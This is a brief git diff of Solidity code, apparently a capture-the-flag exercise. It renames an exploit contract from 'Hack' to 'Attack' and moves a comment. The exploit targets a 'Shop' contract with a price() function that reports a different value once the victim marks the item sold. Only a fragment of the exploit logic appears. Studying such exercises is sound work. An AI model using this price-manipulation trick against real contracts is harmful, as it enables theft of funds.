@@ -19,7 +19,7 @@ contract Shop {
   }
 }
 
-contract Hack{
+contract Attack{
     Shop private immutable victim;
 
     constructor(address _victimAddr){
@@ -32,8 +32,8 @@ contract Hack{
     }
 
     function price() external view returns (uint){
+         // 2nd call
         if (victim.isSold()){
-            // 2nd call
             return 99;
         }
         // 1st call
